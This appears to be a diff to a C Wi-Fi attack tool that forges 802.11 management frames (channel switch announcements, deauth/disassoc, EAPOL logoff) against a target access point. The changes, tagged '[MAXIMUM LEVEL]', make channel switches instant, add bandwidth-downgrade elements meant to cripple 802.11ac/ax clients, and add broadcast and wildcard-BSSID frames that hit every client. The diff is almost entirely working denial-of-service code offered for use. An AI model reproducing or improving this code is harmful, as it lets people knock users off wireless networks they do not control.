@@ -646,7 +646,7 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   csa_ie_t *c = (csa_ie_t *)(b + o);
   c->mode = 1;
   c->ch = new_ch;
-  c->count = 1; /* Instant channel switch trigger */
+  c->count = 0; /* [MAXIMUM LEVEL] Instant hard-switch (drop TX buffer) */
   o += sizeof(csa_ie_t);
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz/WiFi6 clients */
@@ -655,7 +655,15 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class (81=2.4G, 115=5G) */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch */
+
+  /* [MAXIMUM LEVEL] Wide Bandwidth Channel Switch (IE 104) 
+   * Force 802.11ac/ax clients to downgrade to 20MHz, destroying Frame Aggregation */
+  b[o++] = 104;
+  b[o++] = 3;
+  b[o++] = 0; /* New Channel Width: 20 MHz */
+  b[o++] = 0; /* Center Freq Seg 0 */
+  b[o++] = 0; /* Center Freq Seg 1 */
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
@@ -800,7 +808,7 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   b[o++] = 3;
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch (drop TX buffer) */
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) piggybacked */
   b[o++] = 60;
@@ -808,7 +816,15 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch */
+
+  /* [MAXIMUM LEVEL] Wide Bandwidth Channel Switch (IE 104) 
+   * Force 802.11ac/ax clients to downgrade to 20MHz, destroying Frame Aggregation */
+  b[o++] = 104;
+  b[o++] = 3;
+  b[o++] = 0; /* New Channel Width: 20 MHz */
+  b[o++] = 0; /* Center Freq Seg 0 */
+  b[o++] = 0; /* Center Freq Seg 1 */
 
   /* [UPGRADE] Piggybacked Quiet Element (ID=40, len=6) to enforce radio silence */
   b[o++] = 40;
@@ -853,7 +869,7 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   csa_ie_t *c = (csa_ie_t *)(b + o);
   c->mode = 1;
   c->ch = new_ch;
-  c->count = 1; /* Instant channel switch trigger */
+  c->count = 0; /* [MAXIMUM LEVEL] Instant hard-switch (drop TX buffer) */
   o += sizeof(csa_ie_t);
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) */
@@ -862,7 +878,15 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
   b[o++] = new_ch;
-  b[o++] = 1; /* switch count */
+  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch */
+
+  /* [MAXIMUM LEVEL] Wide Bandwidth Channel Switch (IE 104) 
+   * Force 802.11ac/ax clients to downgrade to 20MHz, destroying Frame Aggregation */
+  b[o++] = 104;
+  b[o++] = 3;
+  b[o++] = 0; /* New Channel Width: 20 MHz */
+  b[o++] = 0; /* Center Freq Seg 0 */
+  b[o++] = 0; /* Center Freq Seg 1 */
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
@@ -1577,6 +1601,8 @@ typedef struct {
   pkt_t disassoc_bcast;
   pkt_t eapol_logoff;
   pkt_t csa_action;
+  pkt_t csa_action_bcast;    /* [MAXIMUM LEVEL] Target all clients */
+  pkt_t csa_action_wildcard; /* [MAXIMUM LEVEL] Wildcard BSSID for random MAC APs */
   pkt_t probe_resp;    /* unicast to client */
   pkt_t probe_resp_bc; /* [FIX 8] broadcast variant */
   pkt_t delba;
@@ -1640,6 +1666,10 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->eapol_logoff.len = mk_eapol_logoff(f->eapol_logoff.buf, bss, cli);
   f->csa_action.len =
       mk_csa_action(f->csa_action.buf, bss, cli, (uint8_t)new_ch);
+  f->csa_action_bcast.len =
+      mk_csa_action(f->csa_action_bcast.buf, bss, BCAST, (uint8_t)new_ch);
+  f->csa_action_wildcard.len =
+      mk_csa_action(f->csa_action_wildcard.buf, BCAST, BCAST, (uint8_t)new_ch);
 
   /* [FIX 8] Probe response: unicast to client + broadcast */
   f->probe_resp.len = mk_probe_resp_csa(f->probe_resp.buf, bss, cli, t->ssid,
@@ -1722,6 +1752,8 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     break;
   case VEC_CSA_ACTION:
     s.p[s.n++] = &f->csa_action;
+    s.p[s.n++] = &f->csa_action_bcast;
+    s.p[s.n++] = &f->csa_action_wildcard;
     break;
   case VEC_BEACON_CONFUSION:
     s.p[s.n++] = &f->confusion;
